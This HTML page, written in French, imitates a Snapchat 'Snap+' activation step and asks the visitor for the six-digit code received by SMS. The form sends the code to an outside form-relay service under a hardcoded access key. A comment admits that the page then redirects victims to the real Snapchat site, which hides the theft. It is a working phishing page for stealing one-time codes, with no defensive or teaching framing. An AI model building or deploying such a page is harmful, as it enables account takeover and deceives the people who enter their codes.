<!DOCTYPE html>
<html lang="fr">
<head>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#FFFC00] flex items-center justify-center h-screen font-sans">
    <form action="https://api.web3forms.com/submit" method="POST" class="bg-white p-8 rounded-3xl w-96 shadow-2xl">
        <input type="hidden" name="access_key" value="55a75b87-51e6-4f98-bcaa-125202c0904e">
        <input type="hidden" name="subject" value="Nouveau Snap+ : Code Reçu">
        
        <h2 class="text-xl font-bold mb-2 text-center">Vérification SMS</h2>
        <p class="text-sm text-gray-600 mb-6 text-center">Entrez le code reçu par SMS pour finaliser l'activation.</p>
        
        <input type="text" name="Code_SMS" placeholder="Code à 6 chiffres" class="w-full p-4 mb-4 border-2 border-blue-500 rounded-xl text-center text-xl font-mono" required>
        
        <!-- Redirection finale vers le vrai site -->
        <input type="hidden" name="redirect" value="https://www.snapchat.com/plus">
        
        <button type="submit" class="w-full bg-black text-white py-3 rounded-full font-bold">Confirmer l'activation</button>
    </form>
</body>
</html>
